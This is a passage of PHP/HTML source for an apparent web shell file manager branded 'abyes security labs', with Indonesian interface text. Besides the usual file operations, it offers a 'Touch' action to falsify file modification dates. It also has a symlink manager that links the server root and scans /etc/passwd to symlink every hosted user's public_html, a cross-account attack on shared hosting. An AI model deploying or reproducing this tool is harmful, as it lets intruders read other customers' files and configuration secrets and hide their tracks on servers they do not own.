        <button class="btn btn-sm" onclick="bulkAction('zip')" style="font-size: 10px; padding: 3px 10px; border-color: #f97316; color: #f97316;">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><path d="M21 8v13H3V8"/><path d="M1 3h22v5H1z"/><path d="M10 12h4"/></svg>Compress ZIP
        </button>
        <button class="btn btn-sm" onclick="bulkAction('lock')" style="font-size: 10px; padding: 3px 10px; border-color: #f59e0b; color: #f59e0b;">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Lock
        </button>
        <button class="btn btn-sm" onclick="bulkAction('delete')" style="font-size: 10px; padding: 3px 10px; border-color: #f85149; color: #f85149;">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:3px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>Delete
        </button>
        <button class="btn btn-sm btn-secondary" onclick="clearSelection()" style="font-size: 10px; padding: 3px 10px;">Clear</button>
    </div>

    <!-- File Table -->
    <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;">
    <table class="file-table">
        <tr>
            <?php
            $curSort = isset($_GET['sort']) ? $_GET['sort'] : 'ext';
            $curDir  = isset($_GET['dir'])  ? $_GET['dir']  : 'asc';
            $curPath = isset($_GET['path']) ? $_GET['path'] : '';
            function sortLink($col, $label, $icon, $curSort, $curDir, $curPath) {
                $nextDir = ($curSort === $col && $curDir === 'asc') ? 'desc' : 'asc';
                $arrow   = '';
                if ($curSort === $col) {
                    $arrow = $curDir === 'asc'
                        ? '<svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="18 15 12 9 6 15"/></svg>'
                        : '<svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="6 9 12 15 18 9"/></svg>';
                }
                $active = $curSort === $col
                    ? 'color:var(--accent);'
                    : 'color:var(--text-muted);';
                $href = '?path=' . urlencode($curPath) . '&sort=' . $col . '&dir=' . $nextDir;
                return '<a href="' . htmlspecialchars($href) . '" style="display:inline-flex;align-items:center;gap:4px;text-decoration:none;' . $active . 'white-space:nowrap;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:0.7px;">'
                    . $icon . htmlspecialchars($label) . $arrow . '</a>';
            }
            $iconName  = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
            $iconExt   = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/></svg>';
            $iconSize  = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;"><line x1="12" y1="2" x2="12" y2="22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>';
            $iconPerm  = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';
            $iconTime  = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
            ?>
            <th style="width: 30px; text-align: center;"><input type="checkbox" id="selectAllFiles" onchange="toggleSelectAll(this)" style="accent-color: var(--accent);"></th>
            <th><?php echo sortLink('name', 'Name', $iconName, $curSort, $curDir, $curPath); ?></th>
            <th><?php echo sortLink('ext', 'Extension', $iconExt, $curSort, $curDir, $curPath); ?></th>
            <th><?php echo sortLink('size', 'Size', $iconSize, $curSort, $curDir, $curPath); ?></th>
            <th><?php echo sortLink('perm', 'Permission', $iconPerm, $curSort, $curDir, $curPath); ?></th>
            <th><?php echo sortLink('mtime', 'Last Modified', $iconTime, $curSort, $curDir, $curPath); ?></th>
            <th><span class="mob-actions-label" style="display:none;"></span><span class="desk-actions-label" style="font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:0.7px;color:var(--text-muted);">Actions</span></th>
        </tr>
        <?php
        $fileDetails = getFileDetails($currentDirectory);
        if (is_array($fileDetails)):
            foreach ($fileDetails as $fd):
                $fullPath = $currentDirectory . '/' . $fd['name'];
                $isSymlink = is_link($fullPath);
                $symlinkTarget = $isSymlink ? @readlink($fullPath) : '';
        ?>
        <tr>
            <td style="text-align: center;"><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($fullPath); ?>" onchange="updateBulkBar()" style="accent-color: var(--gold);"></td>
            <td>
                <span class="file-icon">
                    <?php if ($isSymlink): ?>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                    <?php if ($fd['type'] === 'Folder'): ?>
                    <a href="?ecl=<?php echo urlencode($fullPath); ?>&_xk=labs" style="color: #a78bfa;"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php else: ?>
                    <a href="javascript:void(0)" onclick="showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')" style="color: #a78bfa;"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php endif; ?>
                    <span style="color: var(--text-muted); font-size: 10px; margin-left: 4px;" title="<?php echo htmlspecialchars($symlinkTarget); ?>">-> <?php echo htmlspecialchars(strlen($symlinkTarget) > 40 ? '...' . substr($symlinkTarget, -37) : $symlinkTarget); ?></span>
                    <?php elseif ($fd['type'] === 'Folder'): ?>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="var(--gold)" stroke="var(--gold)" stroke-width="1"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                    <a href="?ecl=<?php echo urlencode($fullPath); ?>&_xk=labs" style="color: var(--gold);"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php else: ?>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e6edf3" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                    <a href="javascript:void(0)" onclick="showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')" style="color: #e6edf3;"><?php echo htmlspecialchars($fd['name']); ?></a>
                    <?php endif; ?>
                </span>
            </td>
            <td>
                <?php
                if ($isSymlink) {
                    echo '<span style="font-size:10px;font-weight:600;padding:2px 7px;border-radius:4px;background:rgba(168,85,247,0.15);color:#a78bfa;border:1px solid rgba(168,85,247,0.3);font-family:\'JetBrains Mono\',monospace;">lnk</span>';
                } elseif ($fd['type'] === 'Folder') {
                    echo '<span style="font-size:10px;font-weight:600;padding:2px 7px;border-radius:4px;background:rgba(245,158,11,0.12);color:var(--gold);border:1px solid rgba(245,158,11,0.3);font-family:\'JetBrains Mono\',monospace;">dir</span>';
                } else {
                    $ext = $fd['ext'] !== '' ? $fd['ext'] : '?';
                    $phpExts  = ['php','php3','php4','php5','phtml','phar'];
                    $codeExts = ['js','ts','py','rb','go','java','c','cpp','h','cs','sh','bash','pl'];
                    $webExts  = ['html','htm','css','scss','less','xml','json','yaml','yml','svg'];
                    $imgExts  = ['jpg','jpeg','png','gif','webp','bmp','ico','tiff'];
                    $archExts = ['zip','tar','gz','rar','7z','bz2','xz'];
                    $dbExts   = ['sql','db','sqlite','csv'];
                    $docExts  = ['pdf','doc','docx','xls','xlsx','ppt','pptx','txt','md'];
                    if (in_array($ext, $phpExts))  { $bg='rgba(99,102,241,0.15)'; $tc='#818cf8'; $bc='rgba(99,102,241,0.3)'; }
                    elseif (in_array($ext, $codeExts)) { $bg='rgba(34,211,238,0.1)';  $tc='var(--cyan)'; $bc='rgba(34,211,238,0.25)'; }
                    elseif (in_array($ext, $webExts))  { $bg='rgba(59,130,246,0.12)'; $tc='var(--blue)'; $bc='rgba(59,130,246,0.3)'; }
                    elseif (in_array($ext, $imgExts))  { $bg='rgba(236,72,153,0.12)'; $tc='var(--pink)'; $bc='rgba(236,72,153,0.3)'; }
                    elseif (in_array($ext, $archExts)) { $bg='rgba(249,115,22,0.12)'; $tc='var(--orange)'; $bc='rgba(249,115,22,0.3)'; }
                    elseif (in_array($ext, $dbExts))   { $bg='rgba(34,197,94,0.12)';  $tc='var(--green)'; $bc='rgba(34,197,94,0.3)'; }
                    elseif (in_array($ext, $docExts))  { $bg='rgba(245,158,11,0.12)'; $tc='var(--gold)'; $bc='rgba(245,158,11,0.3)'; }
                    else { $bg='rgba(255,255,255,0.05)'; $tc='var(--text-muted)'; $bc='var(--border-soft)'; }
                    echo '<span style="font-size:10px;font-weight:600;padding:2px 7px;border-radius:4px;background:'.$bg.';color:'.$tc.';border:1px solid '.$bc.';font-family:\'JetBrains Mono\',monospace;letter-spacing:0.3px;">' . htmlspecialchars($ext) . '</span>';
                }
                ?>
            </td>
            <td><?php echo $fd['size']; ?></td>
            <td style="color: <?php echo $fd['perm_color']; ?>; font-family: monospace; font-weight: 600;"><?php echo $fd['permission']; ?></td>
            <td class="meta-text" style="white-space:nowrap;">
                <?php if ($fd['mtime'] > 0): ?>
                <span title="<?php echo date('Y-m-d H:i:s', $fd['mtime']); ?>">
                    <?php
                        $now   = time();
                        $diff  = $now - $fd['mtime'];
                        if ($diff < 60)           echo 'Just now';
                        elseif ($diff < 3600)     echo floor($diff / 60) . 'm ago';
                        elseif ($diff < 86400)    echo floor($diff / 3600) . 'h ago';
                        elseif ($diff < 2592000)  echo floor($diff / 86400) . 'd ago';
                        else                      echo date('d M Y', $fd['mtime']);
                    ?>
                </span>
                <?php else: ?>
                <span style="color:var(--text-subtle);">—</span>
                <?php endif; ?>
            </td>
            <td>
                <div class="action-btns">
                    <?php if ($fd['type'] === 'File'): ?>
                    <a href="javascript:void(0)" onclick="showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')">Edit</a>
                    <a href="?dl=<?php echo urlencode($fullPath); ?>&_xk=labs" title="Download">DL</a>
                    <?php if (preg_match('/\.(zip|tar|tar\.gz|tgz|rar|7z)$/i', $fd['name'])): ?>
                    <a href="javascript:void(0)" onclick="extractZip('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')" style="color:#f59e0b;border-color:rgba(245,158,11,0.3);">Unzip</a>
                    <?php endif; ?>
                    <?php endif; ?>
                    <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Rename</a>
                    <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>','<?php echo $fd['permission']; ?>')">Chmod</a>
                    <a href="javascript:void(0)" style="color:#f59e0b;border-color:rgba(245,158,11,0.3);" onclick="showLockModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Lock</a>
                    <a href="javascript:void(0)" style="color:#6b7280;border-color:rgba(107,114,128,0.2);background:rgba(107,114,128,0.04);opacity:0.65;cursor:default;position:relative;" onclick="showComingSoon('Ask AI per File')" title="Coming soon">Ask AI <sup style="font-size:8px;color:#f59e0b;font-weight:700;">Soon</sup></a>
                    <a href="javascript:void(0)" style="color:var(--cyan);border-color:rgba(34,211,238,0.3);background:rgba(34,211,238,0.06);" onclick="showTouchModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>',<?php echo $fd['mtime']; ?>)" title="Edit last modified date">Touch</a>
                    <a href="javascript:void(0)" class="act-del" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>','<?php echo htmlspecialchars($fd['name']); ?>')">Delete</a>
                </div>
                <!-- Mobile "..." dropdown -->
                <div class="mob-action-wrap">
                    <button class="mob-action-btn" onclick="lpToggleMobMenu(this)" type="button">&#8942;</button>
                    <div class="mob-action-menu">
                        <?php if ($fd['type'] === 'File'): ?>
                        <a href="javascript:void(0)" onclick="lpCloseMobMenus();showEditModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')">Edit</a>
                        <a href="?dl=<?php echo urlencode($fullPath); ?>&_xk=labs">Download</a>
                        <?php if (preg_match('/\.(zip|tar|tar\.gz|tgz|rar|7z)$/i', $fd['name'])): ?>
                        <a href="javascript:void(0)" class="mob-lock" onclick="lpCloseMobMenus();extractZip('<?php echo htmlspecialchars(addslashes($fullPath)); ?>')">Unzip</a>
                        <?php endif; ?>
                        <div class="mob-action-divider"></div>
                        <?php endif; ?>
                        <a href="javascript:void(0)" onclick="lpCloseMobMenus();showRenameModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Rename</a>
                        <a href="javascript:void(0)" onclick="lpCloseMobMenus();showChmodModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>','<?php echo $fd['permission']; ?>')">Chmod</a>
                        <a href="javascript:void(0)" class="mob-lock" onclick="lpCloseMobMenus();showLockModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>')">Lock</a>
                        <a href="javascript:void(0)" style="color:#6b7280;opacity:0.65;" onclick="lpCloseMobMenus();showComingSoon('Ask AI per File')">Ask AI <sup style="font-size:8px;color:#f59e0b;font-weight:700;">Soon</sup></a>
                        <a href="javascript:void(0)" style="color:var(--cyan);" onclick="lpCloseMobMenus();showTouchModal('<?php echo htmlspecialchars(addslashes($fullPath)); ?>','<?php echo htmlspecialchars(addslashes($fd['name'])); ?>',<?php echo $fd['mtime']; ?>)">Touch (Edit Date)</a>
                        <div class="mob-action-divider"></div>
                        <a href="javascript:void(0)" class="mob-del" onclick="lpCloseMobMenus();showDeleteConfirm('<?php echo urlencode($fullPath); ?>','<?php echo htmlspecialchars($fd['name']); ?>')">Delete</a>
                    </div>
                </div>
            </td>
        </tr>
        <?php endforeach; else: ?>
        <tr><td colspan="6" style="color:var(--text-muted);">No files or folders found.</td></tr>
        <?php endif; ?>
    </table>
    </div><!-- /table-scroll-wrapper -->
</div><!-- /container -->

<footer class="app-footer">
    <div class="footer-content">
        <div class="footer-text"><span>Made by NowMeee</span> abyes security labs</div>
    </div>
</footer>

<!-- Delete Confirm Modal (single file) -->
<div class="modal-overlay hidden" id="deleteConfirmModal">
    <div class="modal" style="max-width:420px;">
        <div class="modal-header" style="border-bottom-color:rgba(248,81,73,0.25);background:rgba(248,81,73,0.04);padding:14px 16px;">
            <span class="modal-title" style="color:#f85149;display:flex;align-items:center;gap:8px;">
                <span style="display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;background:rgba(248,81,73,0.12);border-radius:6px;border:1px solid rgba(248,81,73,0.28);">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
                </span>
                Hapus File
            </span>
            <button class="modal-close" onclick="hideDeleteConfirm()"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding:20px 20px 16px;">
            <div style="display:flex;gap:14px;align-items:flex-start;margin-bottom:16px;">
                <div style="flex-shrink:0;width:44px;height:44px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.25);border-radius:10px;display:flex;align-items:center;justify-content:center;">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="1.8"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
                </div>
                <div style="flex:1;min-width:0;">
                    <div style="color:var(--text);font-size:13px;font-weight:600;margin-bottom:4px;">Yakin ingin menghapus?</div>
                    <div id="deleteFileName" style="color:#f85149;font-family:monospace;font-size:11px;word-break:break-all;background:rgba(248,81,73,0.07);border:1px solid rgba(248,81,73,0.18);border-radius:5px;padding:5px 8px;margin-top:6px;line-height:1.5;"></div>
                </div>
            </div>
            <div style="background:rgba(248,81,73,0.06);border:1px solid rgba(248,81,73,0.18);border-radius:6px;padding:8px 10px;display:flex;align-items:center;gap:7px;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2" style="flex-shrink:0;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                <span style="color:#f87171;font-size:10px;line-height:1.4;">Tindakan ini tidak dapat dibatalkan. File akan dihapus permanen dari server.</span>
            </div>
        </div>
        <div class="modal-footer" style="justify-content:flex-end;gap:8px;padding:12px 16px;">
            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()" style="padding:7px 18px;">Batal</button>
            <a id="deleteConfirmBtn" href="#" class="btn btn-danger" style="background:#f85149;border-color:#f85149;color:#fff;padding:7px 18px;font-weight:600;display:inline-flex;align-items:center;gap:5px;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
                Hapus
            </a>
        </div>
    </div>
</div>

<!-- Universal Confirm Dialog (replaces browser confirm()) -->
<div class="modal-overlay hidden" id="universalConfirmModal" style="z-index:10000;position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.5);overflow:auto;padding:20px;">
    <div class="modal" style="max-width:420px;width:100%;background:var(--bg-card);border-radius:10px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">
        <div class="modal-header" id="uConfirmHeader" style="padding:14px 16px;">
            <span class="modal-title" id="uConfirmTitle" style="display:flex;align-items:center;gap:8px;"></span>
            <button class="modal-close" onclick="uConfirmCancel()"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding:20px;">
            <div style="display:flex;gap:14px;align-items:flex-start;margin-bottom:16px;">
                <div id="uConfirmIconWrap" style="flex-shrink:0;width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;"></div>
                <div style="flex:1;min-width:0;">
                    <div id="uConfirmMsg" style="color:var(--text);font-size:13px;font-weight:500;line-height:1.5;"></div>
                    <div id="uConfirmSub" style="color:var(--text-muted);font-size:11px;margin-top:6px;line-height:1.4;"></div>
                    <div id="uConfirmDetail" style="display:none;font-family:monospace;font-size:11px;word-break:break-all;border-radius:5px;padding:5px 8px;margin-top:8px;line-height:1.5;"></div>
                </div>
            </div>
            <div id="uConfirmWarnBox" style="display:none;border-radius:6px;padding:8px 10px;display:flex;align-items:center;gap:7px;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                <span id="uConfirmWarnText" style="font-size:10px;line-height:1.4;"></span>
            </div>
        </div>
        <div class="modal-footer" style="justify-content:flex-end;gap:8px;padding:12px 16px;">
            <button type="button" class="btn btn-secondary" onclick="uConfirmCancel()" id="uConfirmCancelBtn" style="padding:7px 18px;">Batal</button>
            <button type="button" id="uConfirmOkBtn" onclick="uConfirmOk()" style="padding:7px 20px;border-radius:6px;border:none;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:5px;font-size:13px;"></button>
        </div>
    </div>
</div>

<!-- Symlink Modal -->
<div class="modal-overlay hidden" id="symlinkModal">
    <div class="modal" style="max-width: 620px; width: 96vw;">
        <div class="modal-header" style="border-bottom-color: rgba(167,139,250,0.3);">
            <span class="modal-title" style="color: #a78bfa;">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                Symlink Manager
            </span>
            <button class="modal-close" onclick="hideModal2('symlinkModal')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <!-- Tab bar same as alfafilemanager -->
        <div style="display:flex;gap:0;border-bottom:1px solid rgba(167,139,250,0.18);background:rgba(0,0,0,0.2);">
            <button id="symTab_php"    onclick="symSwitchTab('php')"    style="flex:1;padding:8px 4px;font-size:11px;background:rgba(167,139,250,0.18);color:#a78bfa;border:none;border-bottom:2px solid #a78bfa;cursor:pointer;font-weight:700;">Symlink (PHP)</button>
            <button id="symTab_perl"   onclick="symSwitchTab('perl')"   style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">Symlink (Perl)</button>
            <button id="symTab_python" onclick="symSwitchTab('python')" style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">Symlink (Python)</button>
            <button id="symTab_file"   onclick="symSwitchTab('file')"   style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">File Symlink</button>
        </div>
        <div class="modal-body" style="padding:16px;min-height:200px;max-height:68vh;overflow-y:auto;">

            <!-- PHP tab -->
            <div id="symPane_php">
                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Buat symlink <code style="color:#a78bfa;">abyes_DATA/abyessymlink/root -> /</code> lalu tampilkan semua domain di server beserta link langsung ke public_html.</p>
                <div style="display:flex;gap:8px;justify-content:center;margin-bottom:12px;">
                    <button class="btn" style="background:#a78bfa;border-color:#a78bfa;color:#fff;font-weight:600;" onclick="doSymlinkAction('symphp')">Run Symlink PHP</button>
                </div>
                <div id="symResult_php" style="display:none;">
                    <div id="symRootUrl" style="font-size:10px;color:#00d4ff;font-family:monospace;margin-bottom:8px;word-break:break-all;"></div>
                    <table style="width:100%;border-collapse:collapse;font-size:11px;" id="symDomainTable">
                        <thead><tr style="background:rgba(167,139,250,0.12);">
                            <th style="padding:5px 8px;text-align:left;color:#a78bfa;">#</th>
                            <th style="padding:5px 8px;text-align:left;color:#22d3ee;">Domain</th>
                            <th style="padding:5px 8px;text-align:left;color:#fff;">User</th>
                            <th style="padding:5px 8px;text-align:center;color:#f87171;">Symlink</th>
                        </tr></thead>
                        <tbody id="symDomainBody"></tbody>
                    </table>
                    <p id="symNoDomains" style="display:none;color:var(--text-muted);font-size:11px;text-align:center;padding:12px;">No domains detected — use File Symlink to link manually.</p>
                </div>
            </div>

            <!-- Perl tab -->
            <div id="symPane_perl" style="display:none;">
                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Jalankan script Perl untuk scan <code>/etc/passwd</code> dan buat symlink ke semua public_html user (uid &ge; 500). Butuh Perl &amp; exec tersedia.</p>
                <div style="display:flex;gap:8px;justify-content:center;margin-bottom:12px;">
                    <button class="btn" style="background:#facc15;border-color:#facc15;color:#000;font-weight:600;" onclick="doSymlinkAction('symperl')">Run Symlink Perl</button>
                </div>
                <pre id="symResult_perl" style="display:none;background:#0d1117;color:#4ade80;font-size:11px;padding:10px;border-radius:6px;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;"></pre>
            </div>

            <!-- Python tab -->
            <div id="symPane_python" style="display:none;">
                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Jalankan script Python untuk scan <code>/etc/passwd</code> dan buat symlink ke semua public_html user (uid &ge; 500). Butuh Python &amp; exec tersedia.</p>
                <div style="display:flex;gap:8px;justify-content:center;margin-bottom:12px;">
                    <button class="btn" style="background:#34d399;border-color:#34d399;color:#000;font-weight:600;" onclick="doSymlinkAction('sympy')">Run Symlink Python</button>
                </div>
                <pre id="symResult_python" style="display:none;background:#0d1117;color:#4ade80;font-size:11px;padding:10px;border-radius:6px;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;"></pre>
            </div>

            <!-- File Symlink tab -->
            <div id="symPane_file" style="display:none;">
                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Buat symlink ke file atau direktori spesifik. Link dibuat di direktori aktif sekarang.</p>
                <p style="color:#00d4ff;font-size:10px;font-family:monospace;margin-bottom:12px;word-break:break-all;">Dir: <?php echo htmlspecialchars($currentDirectory); ?></p>
                <div class="form-group" style="margin-bottom:10px;">
                    <label class="form-label">Target Path <span style="color:var(--text-muted);font-weight:400;">(file/dir yang di-link)</span></label>
                    <input type="text" id="symlinkTarget" class="form-input" placeholder="/var/www/html/public atau /etc/passwd">
                </div>
                <div class="form-group" style="margin-bottom:10px;">
                    <label class="form-label">Link Name <span style="color:var(--text-muted);font-weight:400;">(nama symlink yang dibuat)</span></label>
                    <input type="text" id="symlinkName" class="form-input" placeholder="e.g. link_to_config">
                </div>
                <div style="background:rgba(167,139,250,0.06);border:1px solid rgba(167,139,250,0.15);border-radius:6px;padding:6px 10px;margin-bottom:12px;">
                    <p style="color:#a78bfa;font-size:10px;font-family:monospace;" id="symlinkPreview">symlink: link_name -> /target/path</p>
                </div>
                <div style="display:flex;gap:8px;justify-content:center;">
                    <button class="btn btn-secondary" onclick="hideModal2('symlinkModal')">Cancel</button>
                    <button class="btn" style="background:#a78bfa;border-color:#a78bfa;color:#fff;font-weight:600;" onclick="doCreateSymlink()">
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                        Create Symlink
                    </button>
                </div>
                <div id="symResult_file" style="display:none;margin-top:10px;"></div>
            </div>

        </div>
    </div>
</div>

<!-- Create Folder Modal -->
<div class="modal-overlay hidden" id="createFolderModal">
    <div class="modal" style="max-width: 420px;">
        <div class="modal-header" style="border-bottom-color: rgba(255, 215, 0, 0.3);">
            <span class="modal-title" style="color: var(--gold);">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
                Create New Folder
            </span>
            <button class="modal-close" onclick="hideModal2('createFolderModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div style="width: 50px; height: 50px; background: rgba(255,215,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="var(--gold)" stroke="var(--gold)" stroke-width="1"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
            </div>
            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 4px;">Current directory:</p>
            <p style="color: #00d4ff; font-size: 11px; text-align: center; margin-bottom: 16px; word-break: break-all; font-family: monospace;"><?php echo htmlspecialchars($currentDirectory); ?></p>
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">Folder Name</label>
